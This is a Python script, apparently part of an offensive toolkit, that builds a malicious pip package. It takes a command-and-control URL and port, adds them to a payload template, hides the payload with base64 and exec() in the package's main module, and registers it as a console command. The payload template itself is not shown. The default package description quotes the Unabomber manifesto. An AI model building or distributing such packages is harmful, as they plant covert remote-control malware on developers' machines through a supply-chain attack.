import argparse
import base64
from pathlib import Path

templates_dir = Path("template")

def build_args():
    parser = argparse.ArgumentParser(description="module to infect libraries")
    parser.add_argument("-u","--c2_public_url", type=str, required=True)
    parser.add_argument("-p","--port", type=int, required=True)
    parser.add_argument("-o","--output", type=str, required=True)
    return parser.parse_args()

def config_toml(toml_path):
    print("Set the configuration from pyproject.toml, type Enter for default value")
    name = input("name: ") or "piper"
    version = input("version: ") or "1.0.0"
    description = input("description: ") or "The Industrial Revolution and its consequences were the greatest disaster for the human race"
    kitten_command = input("kitten_command: ") or "pstart"

    pyproject_toml_content = f'''
[build-system]
requires = ["setuptools>=61"]
build-backend = "setuptools.build_meta"

[project]
name = "{name}"
version = "{version}"
description = "{description}"

requires-python = ">=3.10"
dependencies = [
    "requests>=2.32",
    "websockets>=15.0"
]

[project.scripts]
{kitten_command} = "piper_c2.main:run"
'''
    
    toml_path.write_text(pyproject_toml_content)

def main(port: int, public_url: str, target: str):
    target_dir = Path(target)
    target_dir.mkdir(parents=True, exist_ok=True)
    
    toml_path = target_dir / "pyproject.toml"
    
    config_toml(toml_path)
    
    src_dir = target_dir / "src" / "piper_c2"
    src_dir.mkdir(parents=True, exist_ok=True)
    
    init_file = src_dir / "__init__.py"
    init_file.touch()
    
    payload_template = templates_dir / "payload.py"
    
    if not payload_template.exists():
        print(f"Error: Template file {payload_template} not found")
        return
    
    with payload_template.open("r") as f:
        content = f.read()
    

    payload_content = f'''
service_c2_host = "{public_url}"
service_c2_port = {port}

{content}
'''

    payload_file = src_dir / "main.py"
    payload_file.write_text(payload_content)

    payload_plain = payload_file.read_text()
    b64_payload = base64.b64encode(payload_plain.encode()).decode()
    
    obfuscate_payload = f'''
import base64
exec(base64.b64decode("{b64_payload}").decode())
'''
    
    obfuscated_file = src_dir / "main.py"
    obfuscated_file.write_text(obfuscate_payload)
    
    print(f"Package created successfully in {target_dir}")
    print(f"payload {obfuscate_payload}")
    print(f"To install: pip install -e {target_dir}")

if __name__ == "__main__":
    args = build_args()
    port = args.port
    host = args.c2_public_url
    target = args.output
    main(port, host, target)
